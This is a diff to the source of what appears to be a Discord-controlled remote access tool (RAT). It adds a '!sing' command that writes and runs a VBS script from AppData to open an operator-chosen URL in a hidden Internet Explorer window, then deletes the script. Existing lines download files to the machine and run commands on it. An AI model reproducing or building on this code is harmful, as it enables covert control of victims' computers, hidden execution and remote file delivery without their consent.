@@ -57,7 +57,9 @@ Availaible commands are :
 
 --> !volumemax = Put volume at 100%
 
---> !music = Play your desired music / Syntax = "!music C:/Users/UserExemple/music.mp3"
+--> !sing = Plays a video with the provided url in a hidden window / Syntax = "!sing https://www.youtube.com/watch?v=dQw4w9WgXcQ"
+
+--> !stopsing = Stop the sing command
 
 --> !exit = Exit program-
 
@@ -181,14 +183,26 @@ async def on_message(message):
         urllib.request.urlretrieve(nck, me)
         await  message.channel.send("[*] Command successfuly executed")
 
-    if message.content.startswith("!music"):
-        import pygame
+    if message.content.startswith("!sing"):
+        import os
         volumeup()
-        pygame.mixer.init()
-        pygame.mixer.music.load(message.content[7:])
-        pygame.mixer.music.play()
-
-
+        os.chdir(appdata)
+        choice = message.content[6:]
+        f1=open('x0.vbs', 'a')
+        f1.write('Set ie = CreateObject("InternetExplorer.Application")'+ "\r\n")
+        f1.write("ie.Visible = 0" + "\r\n")
+        f1.write('ie.Navigate2' + ' ' + '"' + choice + '"')
+        f1.close()
+        os.system('x0.vbs')
+        import time
+        time.sleep(10)
+        os.system("del x0.vbs")
+        
+    if message.content.startswith("!stopsing"):
+        import os
+        os.system("taskkill /F /IM iexplore.exe")
+        os.chdir(appdata)
+        os.system("del x0.vbs")
     if message.content.startswith("!output"):
         import subprocess
         import os
